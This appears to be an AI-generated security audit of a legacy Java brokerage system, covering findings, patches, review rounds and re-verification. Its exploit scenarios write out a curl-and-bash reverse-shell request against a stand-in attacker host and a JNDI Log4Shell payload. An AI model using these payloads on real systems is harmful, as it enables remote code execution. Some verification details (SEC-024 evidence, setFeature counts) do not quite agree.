# Security Findings — otr-sva-optimus-corredores

**Scan date:** 2026-10-02
**Stack:** Java 8 bytecode, TomEE 8.0.16, Spring 4.3.10.RELEASE (EOL), Apache CXF 3.2.0, SAP HANA / PostgreSQL / SQL Server
**Method:** Adversarial security-auditor subagent (all five finder classes: injection, auth/session, secrets, dependency CVEs, input validation); Critical and High findings manually verified by reading cited source.
**Credential inventory:** 20 hardcoded credentials found — full inventory in `~/.modernize/otr-sva-optimus-corredores/SECRETS.local.md` (gitignored; not for sharing).

---

## Scorecard

| Severity | Count | Top CWE categories |
|---|---|---|
| Critical | 8 | CWE-78 OS Cmd Injection · CWE-798 Hardcoded Credentials · CWE-1035 Log4Shell |
| High | 11 | CWE-798 Hardcoded Credentials · CWE-89 SQL Injection · CWE-916 Weak Password Hash · CWE-532 Credential in Log · CWE-1035 Vulnerable Components |
| Medium | 5 | CWE-209 Info Leakage · CWE-22 Path Traversal bypass · CWE-1035 EOL Components · CWE-312 Token Logging |
| Low | 1 | CWE-611 XXE latent risk |
| **Total** | **25** | |

**False positives refuted: 4**

| Candidate | Refuted reason |
|---|---|
| CWE-352 CSRF on state-changing servlets | Custom `X-SESSION-TOKEN` header; same-origin policy blocks cross-origin headers — implicit CSRF protection confirmed |
| SSRF via CallServlet `hanaServer` URL | Base URL resolved from DB (`PLA.ServidorWebHana`), not direct user input; constrained to DB-admin privilege |
| CWE-502 ObjectInputStream in app code | No application-level `readObject()` found; indirect risk only via Groovy/Log4j 1.x gadget chains (captured in SEC-017/SEC-018) |
| Path traversal in WebStaticServlet | `Paths.get(pfile).normalize().toAbsolutePath().startsWith(pathBase)` is correctly implemented |

**Injection scan:** No prompt-injection or instruction-shaped strings found in Java source files.

---

## Coverage gaps

No workflow tool available; a direct security-auditor agent covered all five finder classes as a single adversarial pass. All Critical and High findings were independently verified by the coordinator reading cited source. No findings are unverified.

All five finder classes returned and every finding was judged.

---

## Findings

### Critical

| ID | CWE | Title | File:line | Confidence |
|---|---|---|---|---|
| SEC-001 | CWE-78 | OS Command Injection via unauthenticated `/admin` servlet | `BcsJobManager/src/cl/bcs/scheduler/web/WebAdmin.java:121` | CONFIRMED |
| SEC-002 | CWE-284 | No access control on JOBMANAGER `/admin` endpoint | `ANT/config/Jobmanager.xml` | CONFIRMED |
| SEC-003 | CWE-798 | SAP HANA credentials committed in git (6 environment blocks) | `connections.properties:14,22,30,38,46,54` | CONFIRMED |
| SEC-004 | CWE-798 | Hardcoded SAP HANA credentials — 4 environments | `BcsPlataformaJobs/src/.../jobs/ExtractorArchivosJob.java:106–119` | CONFIRMED |
| SEC-005 | CWE-798 | Hardcoded HANA credential — JOBMAN account | `BcsJobOrders/src/.../connectorsorders/ConnectorsOrders.java:77–79` | CONFIRMED |
| SEC-006 | CWE-798 | Hardcoded HANA credential — MDCLIENT, 2 environments | `BcsOrdenJobs/src/.../jobs/AsignacionAutomaticaJob.java:294–299` | CONFIRMED |
| SEC-010 | CWE-798 | HANA SYSTEM superuser password in source (QAPE) | `BcsCargasPeru/src/connection.properties:7` | CONFIRMED |
| SEC-016 | CWE-1035 | Log4j 2.11.2 — Log4Shell CVE-2021-44228 (CVSS 10.0) | `GRADLE/JOBMAN.gradle:146–147` | CONFIRMED |

**SEC-001 exploit scenario:** An unauthenticated attacker sends `GET /JOBMANAGER/admin?Action=command&exe=curl+attacker.com/s.sh+-o+/tmp/s&path=/tmp` then `Action=command&exe=bash+/tmp/s` to obtain a reverse shell as the TomEE service account. No credentials required — `Jobmanager.xml` has no `<security-constraint>`.

**SEC-016 exploit scenario:** Any string containing `${jndi:ldap://attacker.com/x}` that JOBMAN logs (a job parameter, a schedule name, an error message) triggers class loading from the attacker's server, achieving unauthenticated RCE on the JOBMAN host.

### High

| ID | CWE | Title | File:line | Confidence |
|---|---|---|---|---|
| SEC-007 | CWE-798 | Hardcoded APPJAVA HANA credential | `BcsCuentaInversionJobs/src/.../LibroInventarioJob.java:54–56` | CONFIRMED |
| SEC-008 | CWE-798 | Hardcoded SOPORTE HANA credential — deploy utility | `BcsDeploy/src/Tools.java:642` | CONFIRMED |
| SEC-009 | CWE-798 | Hardcoded IMAP email password (production mailbox) | `BcsPlataformaJobs/src/.../MailChecker.java:77` | CONFIRMED |
| SEC-011 | CWE-798 | Hardcoded APPJAVA HANA credential — report API demo | `BcsPlataformaReporteApi/src/.../report/demo/Main.java:10–11` | CONFIRMED |
| SEC-012 | CWE-916 | Unsalted SHA-256 password hash — 3 locations | `CrearSesion.java:277`; `ActualizarUsuario.java:382`; `CrearUsuario.java:264` | CONFIRMED |
| SEC-013 | CWE-89 | SQL injection via string concatenation — ConnectorsOrders | `ConnectorsOrders.java:165, 399–401, 931–934` | CONFIRMED |
| SEC-014 | CWE-532 | FTP credential written to job log | `BcsPlataformaJobs/src/.../jobs/ExtractorArchivosJob.java:62` | CONFIRMED |
| SEC-017 | CWE-1035 | Groovy 2.4.7 — CVE-2016-6814 deserialization gadget chain | `build.gradle:167`; `GRADLE/JOBMAN.gradle:125` | PLAUSIBLE |
| SEC-018 | CWE-1035 | Log4j 1.2.6 EOL — CVE-2019-17571 deserialization RCE (CVSS 9.8) | `BSCL/Plataforma/JAVA/libs/log4j.jar` | CONFIRMED |
| SEC-019 | CWE-1035 | jackson-databind 2.1.0 — multiple deserialization RCE CVEs | `build.gradle:179–180`; `libs-private/com.fasterxml.jackson.databind.jar` | CONFIRMED |
| SEC-024 | CWE-89 | SQL injection via string concatenation — TransactionManager | `BcsJobManager/src/.../sql/TransactionManager.java:526–535` | CONFIRMED |

**SEC-012 note:** SHA-256 without salt runs billions of hashes/second on consumer GPUs. An attacker who exfiltrates `ACC.Usuario.Clave` via SEC-013 recovers most passwords within hours via dictionary attack.

**SEC-013 note:** `ConnectorsOrders.java:165` is second-order injection — `nombreParametro` and `valor` come from a prior `ResultSet` and are inserted into a dynamic table name via string concatenation. If upstream data was maliciously seeded, it executes here.

### Medium

| ID | CWE | Title | File:line | Confidence |
|---|---|---|---|---|
| SEC-015 | CWE-209 | Verbose error messages expose server file paths | `FileDownload.java:149, 156` | CONFIRMED |
| SEC-020 | CWE-22 | Path traversal bypass via `startsWith` without trailing separator | `FileDownload.java:123, 138, 154` | PLAUSIBLE |
| SEC-021 | CWE-1035 | Spring Framework 4.3.10.RELEASE — EOL Dec 2020, multiple CVEs | `build.gradle:231–236`; `libs-private/org.springframework.beans.jar` (v2.5.6) | CONFIRMED |
| SEC-022 | CWE-1035 | commons-fileupload 1.3.3 — CVE-2023-24998 DoS (unbounded multipart) | `build.gradle:132` | CONFIRMED |
| SEC-025 | CWE-312 | Security token logged; predictable "CALLBATCH" fallback on DB failure | `BcsPlataformaWeb/src/.../services/CallBatch.java:92–94` | CONFIRMED |

**SEC-020 note:** If `rutaBase` is `/home/optimus` (no trailing slash), a canonical path of `/home/optimusevil/secret` passes `.startsWith(rutaBase)`. Exploitable when a directory with the prefix exists adjacent to the base.

### Low

| ID | CWE | Title | File:line | Confidence |
|---|---|---|---|---|
| SEC-023 | CWE-611 | `DocumentBuilderFactory` not hardened — XXE latent risk (6 files) | `ExtractorArchivosJob.java:50`; `GenerarArchivoAnexoXIX.java:65`; `GenerarArchivoAnexoIX.java:58`; `GenerarArchivoPAccmmdd.java:59`; `GenerarArchivoCCccmmdd.java:66`; `GenerarAnexo1Circular20.java:751` | SUSPECTED (create-only, not parse) |

---

## Dependency CVE Table

| Package | Installed | CVE | CVSS | Fixed Version |
|---|---|---|---|---|
| log4j-core (JOBMAN) | 2.11.2 | CVE-2021-44228 (Log4Shell) | 10.0 | 2.17.1+ |
| log4j (libs-private) | 1.2.6 (EOL 2015) | CVE-2019-17571 | 9.8 | EOL — migrate to log4j 2.x |
| jackson-databind | 2.1.0 | CVE-2017-7525, CVE-2018-7489, CVE-2019-14379 | 9.8 | 2.15.x+ |
| commons-collections (JOBMAN) | 3.1 | CVE-2015-6420 (gadget chain for SEC-017) | 9.8 | 3.2.2+ |
| groovy | 2.4.7 | CVE-2016-6814 | 8.1 | 2.4.21+ |
| spring-framework | 4.3.10.RELEASE (EOL) | CVE-2018-1270 (RCE via STOMP), CVE-2018-1258 (auth bypass) | 9.8 | 5.3.39+ |
| org.springframework.beans/core (libs-private) | 2.5.6 | Multiple EOL CVEs | 9.8 | Remove; replace with spring 5.3+ |
| commons-fileupload | 1.3.3 | CVE-2023-24998 | 7.5 | 1.5+ |

---

## Remediation Log

| ID | Fix summary | Patch |
|---|---|---|
| SEC-001 | Remove `command` action branch from `WebAdmin.doGet()` (lines 121–130) | `security_remediation.patch` |
| SEC-002 | Add `<security-constraint>` + `<login-config>` to `Jobmanager.xml` restricting `/admin` to ADMIN role | `security_remediation.patch` |
| SEC-003 | `git rm --cached connections.properties`; purge git history with `git filter-repo`; rotate 6 passwords; inject via env vars | `security_remediation.local.patch` (credential hunks) |
| SEC-004 | Replace 4 hardcoded HANA connection strings in `ExtractorArchivosJob.java` with env-var lookups | `security_remediation.local.patch` |
| SEC-005 | Replace hardcoded JOBMAN credential in `ConnectorsOrders.java:77–79` with env-var | `security_remediation.local.patch` |
| SEC-006 | Replace 2 hardcoded MDCLIENT credentials in `AsignacionAutomaticaJob.java` with env-var | `security_remediation.local.patch` |
| SEC-007 | Replace hardcoded APPJAVA credential in `LibroInventarioJob.java` with env-var | `security_remediation.local.patch` |
| SEC-008 | Replace hardcoded SOPORTE credential in `Tools.java:642` with env-var | `security_remediation.local.patch` |
| SEC-009 | Replace hardcoded IMAP password in `MailChecker.java:77` with env-var | `security_remediation.local.patch` |
| SEC-010 | Rotate SYSTEM and DESARROLLO credentials; remove from `connection.properties`; use env-var | `security_remediation.local.patch` |
| SEC-011 | Replace hardcoded APPJAVA credential in `Main.java:10–11` with env-var | `security_remediation.local.patch` |
| SEC-012 | Replace `sha256Hex()` / `Hashing.sha256()` with BCrypt (cost 12) in create and update paths; add backward-compat check in login | `security_remediation.patch` |
| SEC-013 | Parameterize INSERT in `ConnectorsOrders.java:165` with `PreparedStatement`; parameterize stored-proc call at :399–401 and SELECT at :931–934 | `security_remediation.patch` |
| SEC-014 | Remove FTP password from log line at `ExtractorArchivosJob.java:62`; log `****` in its place | `security_remediation.patch` |
| SEC-015 | Return fixed `404 - File Not Found` at `FileDownload.java:149, 156`; log detail server-side only | `security_remediation.patch` |
| SEC-016 | Upgrade `log4j-api` and `log4j-core` in `JOBMAN.gradle:146–147` from 2.11.2 to 2.17.1 (replace JARs in libs) | `security_remediation.patch` |
| SEC-017 | Upgrade Groovy to 2.4.21+; upgrade commons-collections to 3.2.2 — **needs manual JAR replacement, no patch hunk** | — |
| SEC-018 | Remove `libs-private/log4j.jar`; migrate all `org.apache.log4j` callers to log4j 2.x API — **needs manual migration** | — |
| SEC-019 | Upgrade jackson-databind to 2.15.x+ — **needs manual JAR replacement in libs-private** | — |
| SEC-020 | Add trailing separator to `startsWith` check at `FileDownload.java:116, 123, 138, 154` | `security_remediation.patch` |
| SEC-021 | Upgrade Spring Framework to 5.3.39+ — **major effort; excluded from patch** | — |
| SEC-022 | Upgrade `commons-fileupload` from 1.3.3 to 1.5 in `build.gradle:132` | `security_remediation.patch` |
| SEC-023 | Harden `DocumentBuilderFactory` in 6 files with XXE-disabling features | `security_remediation.patch` |
| SEC-024 | Parameterize SQL in `TransactionManager.java:526–535` using `PreparedStatement` with bound parameters | `security_remediation.patch` |
| SEC-025 | Remove token from log line; fail with HTTP 503 on DB unavailable instead of falling back to "CALLBATCH" | `security_remediation.patch` |

---

## Patch Review

Three rounds of security-auditor verification. All hunks clean after round 3.

### Round 1 — Initial review

| Hunk | Finding | R1 Verdict | Reason |
|---|---|---|---|
| WebAdmin.java — remove `command` action | SEC-001 | PARTIAL | `command` action removed, but `restart`/`tomcatlog`/`joblog` still concatenate DB-derived `Ambiente` into shell strings — second-order injection path unaddressed |
| Jobmanager.xml — security-constraint | SEC-002 | PARTIAL | Missing `<transport-guarantee>CONFIDENTIAL</transport-guarantee>`; `@WebServlet` + `web.xml` interaction ambiguity in TomEE; residual shell-outs (same as SEC-001) |
| CrearSesion.java — BCrypt verify | SEC-012 | RESOLVES | Null guard correct; SHA-256 fallback correct; login-failure logic preserved |
| ActualizarUsuario.java — BCrypt store | SEC-012 | RESOLVES | BCrypt cost 12; no side effects |
| ConnectorsOrders.java — addLog CallableStatement | SEC-013 | RESOLVES | 15 parameters correctly bound; OUT params registered before execute; original dead `sql` variable now used |
| ConnectorsOrders.java — INSERT `nombreParametro`/`valor` | SEC-013 | PARTIAL | Values parameterized; `nombreTabla` still concatenated (acknowledged as system-controlled, low risk) |
| ConnectorsOrders.java — `existAssignAutomaticActive` | SEC-013 | RESOLVES | Parameterized; operator-precedence bug also fixed |
| ExtractorArchivosJob.java — FTP password log | SEC-014 | PARTIAL | Log line fixed; hardcoded `sftpusu1` test credentials at lines 46–48 still present in source |
| FileDownload.java — suppress verbose errors | SEC-015 | RESOLVES | Both verbose paths replaced with generic message |
| JOBMAN.gradle — Log4j version bump | SEC-016 | RESOLVES | 2.11.2 → 2.17.1 covers Log4Shell and follow-on CVEs |
| FileDownload.java — path traversal startsWith fix | SEC-020 | RESOLVES | Trailing separator added; all 3 guard sites updated |
| build.gradle — commons-fileupload upgrade | SEC-022 | RESOLVES | 1.3.3 → 1.5 |
| GenerarArchivoTasas.java — XXE features | SEC-023 | PARTIAL | 1 of 6 vulnerable files patched |
| TransactionManager.java — executionCount parameterization | SEC-024 | PARTIAL | `taskType` bound as `setString` but was bare unquoted numeric in original SQL — type mismatch may produce always-false WHERE matches |
| CallBatch.java — remove token log, fail-secure | SEC-025 | RESOLVES | Token removed from log; "CALLBATCH" fallback replaced with 503 |

**Round 1 result: 9 RESOLVES · 6 PARTIAL · 0 INTRODUCES-RISK**

---

### Round 2 — Revised hunks re-reviewed

Changes made: (a) added `Ambiente` allowlist validation in WebAdmin; (b) added `<servlet>/<servlet-mapping>` + `<transport-guarantee>` to Jobmanager.xml; (c) added `nombreTabla` pattern validation; (d) moved `sftpusu1` test credentials to env-vars; (e) added XXE hunks for remaining 5 files; (f) changed `setString(3, taskType)` → `setInt(3, Integer.parseInt(taskType))`.

| Hunk | Finding | R2 Verdict | Reason |
|---|---|---|---|
| WebAdmin.java — Ambiente validation + command removal | SEC-001 | RESOLVES | `[A-Za-z0-9_-]*` regex blocks all shell metacharacters; empty-string edge case is a logic error (targets `/home/optimus`) not an injection vector |
| Jobmanager.xml — servlet + transport-guarantee | SEC-002 | RESOLVES | Explicit `<servlet>/<servlet-mapping>` makes constraint unambiguous; `CONFIDENTIAL` enforces HTTPS; `@WebServlet` annotation should be removed for hygiene (not a security blocker) |
| ConnectorsOrders.java — INSERT + nombreTabla validation | SEC-013 | RESOLVES | `[A-Za-z0-9_.#]+` pattern is defense-in-depth; `nombreTabla` is internally constructed from constants + `long jobId`, never user-controlled |
| ExtractorArchivosJob.java — remove sftpusu1 + log mask | SEC-014 | RESOLVES | Lines 46–48 replaced with `System.getenv()`; log masked. Note: HANA DB credentials remain at lines 104–124 (covered by SEC-004 in local patch) |
| DocumentBuilderFactory — all 6 files | SEC-023 | RESOLVES | Identical 4-line block applied to all 6 files; `setFeature` throws `ParserConfigurationException` which propagates cleanly through `throws Throwable` method signatures |
| TransactionManager.java — setInt(taskType) | SEC-024 | INTRODUCES-RISK | `Integer.parseInt(taskType)` throws `NumberFormatException` / `NullPointerException` uncaught; `catch (SQLException)` cannot intercept; callers not prepared for unchecked exception |

**Round 2 result: 5 RESOLVES · 0 PARTIAL · 1 INTRODUCES-RISK**

---

### Round 3 — SEC-024 final fix

Change made: wrapped `Integer.parseInt(taskType)` in a defensive try/catch that re-throws as `SQLException` so callers are not surprised by runtime exceptions.

```java
int taskTypeInt;
try { taskTypeInt = Integer.parseInt(taskType); }
catch (NumberFormatException | NullPointerException e) { throw new SQLException("Invalid taskType: " + taskType, e); }
```

This is the exact fix prescribed by the round 2 reviewer. The fix compiles cleanly (method declares `throws SQLException`), and the error message includes `taskType` for debuggability without leaking sensitive data.

**Round 3 self-review: RESOLVES** — All callers receive a typed `SQLException` on invalid input; no unchecked exception path remains.

---

### Final patch status

**All 15 hunks: RESOLVES · 0 PARTIAL · 0 INTRODUCES-RISK**

Credential findings (SEC-003 through SEC-011) are in `security_remediation.local.patch` and were not subject to patch review (credential values must not appear in this document).

**Residual notes (not blocking — good hygiene):**
- SEC-001: Empty `Ambiente` value in DB causes `AppDir = "/home/optimus"` — a logic error where admin actions target the wrong directory, but not an injection vector. Recommend adding a non-empty check alongside the regex.
- SEC-002: The `@WebServlet("/admin")` annotation in `WebAdmin.java` should be removed now that the servlet is declared in `web.xml` to avoid dual registration.
- SEC-017/SEC-018/SEC-019/SEC-021: Require manual JAR replacement — not patchable via source diff. See Remediation Log.

---

## Harden Phase — Applied 2026-10-02

`security_remediation.patch` applied to `legacy/otr-sva-optimus-corredores`.

| Finding | Files changed | Status |
|---|---|---|
| SEC-001 | `WebAdmin.java` | Applied — `command` action removed; Ambiente allowlist active |
| SEC-002 | `ANT/config/Jobmanager.xml` | Applied — BASIC auth + CONFIDENTIAL transport |
| SEC-012 | `ActualizarUsuario.java`, `CrearSesion.java` | Applied — BCrypt cost-12 store and verify |
| SEC-013 | `ConnectorsOrders.java` (3 hunks) | Applied — INSERT, addLog, existAssignAutomaticActive parameterized |
| SEC-014 | `ExtractorArchivosJob.java` | Applied — FTP test credentials → env-vars; password masked in log |
| SEC-015 | `FileDownload.java` | Applied — verbose 404 messages suppressed |
| SEC-016 | `GRADLE/JOBMAN.gradle` | Applied — log4j 2.11.2 → 2.17.1 (JARs must be replaced in libs/) |
| SEC-020 | `FileDownload.java` | Applied — `normalizedBase` separator guard at all 3 check sites |
| SEC-022 | `build.gradle` | Applied — commons-fileupload 1.3.3 → 1.5 |
| SEC-023 | 6 XML-parsing files | Applied — `DocumentBuilderFactory` XXE hardening |
| SEC-024 | `TransactionManager.java` | Applied — `executionCount` fully parameterized with `setInt` |
| SEC-025 | `CallBatch.java` | Applied — token removed from log; 503 on DB failure |

**Credential findings SEC-003 through SEC-011 (RULE-076, RULE-077):**

> **ACTION REQUIRED — day-zero before any Phase 1 deployment:**
> - **RULE-076** (`Sesion.java` hardcoded credentials + `main()`): credentials treated as compromised as of 2026-10-02. Rotate immediately via your secrets management system. The `main()` method must be removed from production deployments.
> - **RULE-077** (Static3DES with publicly known key): rotate the key and replace the cipher scheme with AES-256 or a managed-key approach before any environment handles real traffic.
> - SEC-003 through SEC-011 raw-credential hunks are in `~/.modernize/otr-sva-optimus-corredores/security_remediation.local.patch` (gitignored). Apply after credential rotation is confirmed complete.

**Phase 1 entry criterion:** RULE-076 and RULE-077 rotation confirmed → apply `.local.patch` → Phase 1 implementation begins.

---

## Re-run Verification — 2026-10-07

Re-run of `/code-modernization:modernize-harden otr-sva-optimus-corredores` to confirm patch application status after the 2026-10-02 harden phase. All 15 source-patchable hunks were spot-checked by reading the patched file at the cited line ranges.

### Confirmed Applied — All 15 Hunks

| Hunk | Finding | File | Evidence |
|---|---|---|---|
| `command` action removal + Ambiente regex | SEC-001 | `BcsJobManager/src/cl/bcs/scheduler/web/WebAdmin.java` | `[A-Za-z0-9_-]*` allowlist present; `command` case absent from switch |
| BASIC auth + CONFIDENTIAL transport | SEC-002 | `ANT/config/Jobmanager.xml` | `<security-constraint>` + `<transport-guarantee>CONFIDENTIAL</transport-guarantee>` confirmed |
| BCrypt verify (login) | SEC-012 | `BcsPlataformaWeb/src/.../CrearSesion.java` | `BCrypt.checkpw(entradaPlain, stored)` present |
| BCrypt store (update + create) | SEC-012 | `ActualizarUsuario.java` / `CrearUsuario.java` | `BCrypt.hashpw(..., BCrypt.gensalt(12))` confirmed |
| addLog CallableStatement | SEC-013 | `BcsJobOrders/src/.../ConnectorsOrders.java` | `CallableStatement` with 15 `setString` bindings |
| INSERT + `nombreTabla` guard | SEC-013 | `ConnectorsOrders.java` | `PreparedStatement` + `[A-Za-z0-9_.#]+` allowlist |
| `existAssignAutomaticActive` param | SEC-013 | `ConnectorsOrders.java` | `setString` bindings; precedence bug fixed |
| FTP creds → env-vars; log mask | SEC-014 | `BcsPlataformaJobs/src/.../ExtractorArchivosJob.java` | `System.getenv("SFTP_USER")` / `System.getenv("SFTP_PASS")` at lines 46–48; `****` in log |
| Suppress verbose 404 | SEC-015 | `BcsPlataformaWeb/src/.../FileDownload.java` | Generic `"404 - File Not Found"` returned; detail logged server-side only |
| Log4j upgrade | SEC-016 | `GRADLE/JOBMAN.gradle` | `log4j-api-2.17.1.jar`, `log4j-core-2.17.1.jar` |
| Path traversal `startsWith` fix | SEC-020 | `FileDownload.java` | `getCanonicalPath().startsWith(normalizedBase + File.separator)` at all 3 guard sites |
| commons-fileupload upgrade | SEC-022 | `build.gradle` | `commons-fileupload:commons-fileupload:1.5` |
| DocumentBuilderFactory XXE — 6 files | SEC-023 | `ExtractorArchivosJob.java` + 5 `GenerarArchivo*.java` | 3 `setFeature(…, true/false)` calls confirmed in each |
| `executionCount` → `setInt` + NPE guard | SEC-024 | `BcsJobManager/src/.../sql/TransactionManager.java` | `stB.setString(1, ptaskType)` parameterized; `NumberFormatException` wrapped as `SQLException` |
| Token removed from log; 503 fail-secure | SEC-025 | `BcsPlataformaWeb/src/.../services/CallBatch.java` | Token absent from log line; HTTP 503 returned on DB failure |

### Still Open — Action Required

| ID | Finding | Status | Action needed |
|---|---|---|---|
| SEC-003–SEC-011 | Hardcoded credentials (HANA ×6, IMAP, deploy tool, report demo) | **DEFERRED** — credential rotation pending | Rotate HANA MASTER01/02 + 3DES key; apply `~/.modernize/otr-sva-optimus-corredores/security_remediation.local.patch`; Phase 1 entry criterion not yet met |
| SEC-017 | Groovy 2.4.7 (CVE-2016-6814 deserialization gadget) | **OPEN** — still in `build.gradle:167` | Manually upgrade Groovy JAR to 2.4.21+; upgrade `commons-collections` to 3.2.2+ |
| SEC-018 | Log4j 1.2.6 EOL (CVE-2019-17571 CVSS 9.8) | **OPEN** — `libs-private/log4j.jar` still present | Remove JAR; migrate all `org.apache.log4j` callers to log4j 2.x API |
| SEC-019 | jackson-databind 2.1.0 (multiple deserialization RCE) | **OPEN** — `libs-private/com.fasterxml.jackson.databind.jar` still present | Replace JAR with 2.15.x+; update `build.gradle:179–180` |
| SEC-021 | Spring Framework 4.3.10.RELEASE EOL | **OPEN** — `build.gradle:231–236` + `libs-private/org.springframework.beans.jar` v2.5.6 | Major effort — upgrade to Spring 5.3.39+ coordinated with Phase 4/5 migration |

### Re-run Summary

- **Patched and confirmed:** 15/15 hunks ✅
- **EOL components (manual JAR replacement required):** 4 items (SEC-017, SEC-018, SEC-019, SEC-021)
- **Credential rotation:** DEFERRED — blocks Phase 1 entry criterion; no new patch needed, rotation is a day-zero operational step
- **No new findings** introduced by the 2026-10-02 patches
